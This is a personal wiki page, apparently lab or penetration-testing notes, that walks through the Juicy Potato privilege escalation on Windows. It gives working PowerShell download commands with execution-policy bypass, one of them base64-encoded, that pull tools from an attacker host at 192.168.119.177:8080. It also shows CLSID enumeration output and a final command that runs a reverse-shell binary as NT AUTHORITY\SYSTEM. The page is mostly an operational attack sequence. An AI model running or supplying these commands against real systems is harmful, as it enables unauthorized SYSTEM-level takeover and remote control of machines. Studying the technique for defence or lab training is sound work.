Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-11-24T13:27:18-05:00

====== Juicy Potato ======
Created Wednesday 24 November 2021


This is a technique that can escalate the privileges of a service account to NT AUTHORITY\SYSTEM.


===== Requirements =====
1 -  User account usually a service account with the impersonation privileges of the following enabled.
* SeImpersonatePrivilege                         and/or
* SeAssignPrimaryTokenPrivilege

2 - A COM server with a unique CLSID. The authors of juicy Potato compiled lists of unique CLSIDs for different Windows versions to abuse â€” http://ohpe.it/juicy-potato/CLSID/.

===== Affected Versions =====
[[Technologies:Windows:Versions:Windows 10:Enterprise|Windows 10 Enterprise]]
[[Technologies:Windows:Versions:Windows 10:Pro|Windows 10 Pro]]
[[Technologies:Windows:Versions:Windows 7:Enterprise|Windows 7 Enterprise]]
[[Technologies:Windows:Versions:Windows 8.1:Enterprise|Windows 8.1 Enterprise]]
[[Technologies:Windows:Versions:Windows Server 2008:R2 Enterprise|Windows Server 2008 R2 Enterprise]]
[[Technologies:Windows:Versions:Windows Server 2012:Datacenter|Windows Server 2012 Datacenter]]
[[Technologies:Windows:Versions:Windows Server 2016 Standard|Windows Server 2016 Standard]]

===== Unaffected versions =====
[[Technologies:Windows:Versions:Windows Server 2019 Standard]]
Windows 10 1809 and higher


===== Attack chain =====

==== First, enumerate the privileges of the current user ====
{{./pasted_image.png}}
* Our user has the right privilege to execute this attack


===== Upload CLSID enumerator to system: =====
{{{code: lang="texinfo" linenumbers="False"
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.177:8080/GetCLSID.ps1', 'GetCLSID.ps1')
}}}

* This file is located in the ~/tools/juicypotato dir

===== Run the script =====
{{{code: lang="texinfo" linenumbers="False"
powershell .\GetCLSID.ps1
}}}

* This will enumerate all the CLSID's that could be used in the attack, and put them in their own subfolder
{{{code: lang="texinfo" linenumbers="False"
C:\Windows\Temp\test2>powershell .\GetCLSID.ps1
powershell .\GetCLSID.ps1

Name           Used (GB)     Free (GB) Provider      Root                      
----           ---------     --------- --------      ----                      
HKCR                                   Registry      HKEY_CLASSES_ROOT         
Looking for CLSIDs
Looking for APIDs
Joining CLSIDs and APIDs

PSPath            : Microsoft.PowerShell.Core\FileSystem::C:\Windows\Temp\test2
                    \Windows_Server_2016_Standard
PSParentPath      : Microsoft.PowerShell.Core\FileSystem::C:\Windows\Temp\test2
PSChildName       : Windows_Server_2016_Standard
PSDrive           : C
PSProvider        : Microsoft.PowerShell.Core\FileSystem
PSIsContainer     : True
Name              : Windows_Server_2016_Standard
FullName          : C:\Windows\Temp\test2\Windows_Server_2016_Standard
Parent            : test2
Exists            : True
Root              : C:\
Extension         : 
CreationTime      : 11/24/2021 6:58:18 PM
CreationTimeUtc   : 11/24/2021 6:58:18 PM
LastAccessTime    : 11/24/2021 6:58:18 PM
LastAccessTimeUtc : 11/24/2021 6:58:18 PM
LastWriteTime     : 11/24/2021 6:58:18 PM
LastWriteTimeUtc  : 11/24/2021 6:58:18 PM
Attributes        : Directory
Mode              : d-----
BaseName          : Windows_Server_2016_Standard
Target            : {}
LinkType          : 




C:\Windows\Temp\test2>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8EE3-242E

 Directory of C:\Windows\Temp\test2

11/24/2021  06:58 PM    <DIR>          .
11/24/2021  06:58 PM    <DIR>          ..
11/24/2021  06:57 PM             1,580 GetCLSID.ps1
11/24/2021  06:58 PM    <DIR>          Windows_Server_2016_Standard
               1 File(s)          1,580 bytes
               3 Dir(s)  10,549,006,336 bytes free

}}}


===== cd into the subfolder and upload test_clsid.bat =====
{{{code: lang="texinfo" linenumbers="False"
C:\Windows\Temp\test2>cd Windows_Server_2016_Standard

C:\Windows\Temp\test2\Windows_Server_2016_Standard>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.177:8080/test_clsid.bat', 'test_clsid.bat')
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.177:8080/test_clsid.bat', 'test_clsid.bat')
}}}



===== upload juicypotato.exe =====
{{{code: lang="texinfo" linenumbers="False"
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -e KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAxADkALgAxADcANwA6ADgAMAA4ADAALwBKAHUAaQBjAHkAUABvAHQAYQB0AG8ALgBlAHgAZQAnACwAIAAnAEoAdQBpAGMAeQBQAG8AdABhAHQAbwAuAGUAeABlACcAKQA=
}}}


===== Run test_clsid.bat =====
{{{code: lang="texinfo" linenumbers="False"
test_clsid.bat
{D6015EC3-FA16-4813-9CA1-DA204574F5DA} 10000
{c980e4c2-c178-4572-935d-a8a429884806} 10000
{F01D6448-0959-4E38-B6F6-B6643D4558FE} 10000
{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8} 10000
{03ca98d6-ff5d-49b8-abc6-03dd84127020} 10001
{1F3775BA-4FA2-4CA0-825F-5B9EC63C0029} 10001
{69486DD6-C19F-42e8-B508-A53F9F8E67B8} 10002
{FD3659E9-A920-4123-AD64-7FC76C7AACDF} 10002
{d20a3293-3341-4ae8-9aaf-8e397cb63c34} 10002
{42CBFAA7-A4A7-47BB-B422-BD10E9D02700} 10003
--SNIP--
{0A886F29-465A-4aea-8B8E-BE926BFAE83E} 10004
{8B4B437E-4CAB-4e83-89F6-7F9F7DF414EA} 10004
{8C482DCE-2644-4419-AEFF-189219F916B9} 10004
{42C21DF5-FB58-4102-90E9-96A213DC7CE8} 10004
{C63261E4-6052-41FF-B919-496FECF4C4E5} 10005
{FFE1E5FE-F1F0-48C8-953E-72BA272F2744} 10006
{1BE1F766-5536-11D1-B726-00C04FB926AF} 10007
{35b1d3bb-2d4e-4a7c-9af0-f2f677af7c30} 10008
{145B4335-FE2A-4927-A040-7C35AD3180EF} 10008
{D3DCB472-7261-43ce-924B-0704BD730D5F} 10008
{E0F55444-C140-4EF4-BDA3-621554EDB573} 10008
{08D9DFDF-C6F7-404A-A20F-66EEC0A609CD} 10008
{22f5b1df-7d7a-4d21-97f8-c21aefba859c} 10009
{5BF9AA75-D7FF-4aee-AA2C-96810586456D} 10010
{5C03E1B1-EB13-4DF1-8943-2FE8E7D5F309} 10011

}}}

* Displayed are clsid : portnr pairs

===== Type result.log =====
{{{code: lang="texinfo" linenumbers="False"
type result.log
{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8};NT AUTHORITY\SYSTEM
{1F3775BA-4FA2-4CA0-825F-5B9EC63C0029};NT AUTHORITY\LOCAL SERVICE
{d20a3293-3341-4ae8-9aaf-8e397cb63c34};NT AUTHORITY\SYSTEM
{42CBFAA7-A4A7-47BB-B422-BD10E9D02700};NT AUTHORITY\SYSTEM
{42C21DF5-FB58-4102-90E9-96A213DC7CE8};NT AUTHORITY\SYSTEM
{C63261E4-6052-41FF-B919-496FECF4C4E5};NT AUTHORITY\SYSTEM
{FFE1E5FE-F1F0-48C8-953E-72BA272F2744};NT AUTHORITY\SYSTEM
{1BE1F766-5536-11D1-B726-00C04FB926AF};NT AUTHORITY\LOCAL SERVICE
{08D9DFDF-C6F7-404A-A20F-66EEC0A609CD};NT AUTHORITY\SYSTEM
{22f5b1df-7d7a-4d21-97f8-c21aefba859c};NT AUTHORITY\LOCAL SERVICE
{5BF9AA75-D7FF-4aee-AA2C-96810586456D};NT AUTHORITY\LOCAL SERVICE
{A47979D2-C419-11D9-A5B4-001185AD2B89};NT AUTHORITY\LOCAL SERVICE
{581333F6-28DB-41BE-BC7A-FF201F12F3F6};NT AUTHORITY\LOCAL SERVICE
{4661626C-9F41-40A9-B3F5-5580E80CB347};NT AUTHORITY\SYSTEM
{0fb40f0d-1021-4022-8da0-aab0588dfc8b};NT AUTHORITY\LOCAL SERVICE
{B91D5831-B1BD-4608-8198-D72E155020F7};NT AUTHORITY\SYSTEM
{97061DF1-33AA-4B30-9A92-647546D943F3};NT AUTHORITY\SYSTEM
{8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\SYSTEM
{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381};NT AUTHORITY\SYSTEM
{0134A8B2-3407-4B45-AD25-E9F7C92A80BC};NT AUTHORITY\SYSTEM
{5B3E6773-3A99-4A3D-8096-7765DD11785C};NT AUTHORITY\SYSTEM
}}}

* Any of these CLSID's should run your program as the specified user

===== Spawn process =====
{{{code: lang="texinfo" linenumbers="False"
juicypotato -t * -l <port> -p %temp%\revshell_rawa.exe -c {C63261E4-6052-41FF-B919-496FECF4C4E5}
}}}

* This should run %temp%\revshell_rawa.exe as NT AUTHORITY\SYSTEM
* Use the port number in the above output that corresponds with the clsid

==== See ====
https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

===== SEE =====
[[Tools:Windows:JuicyPotato]]
https://github.com/ohpe/juicy-potato  # Bins
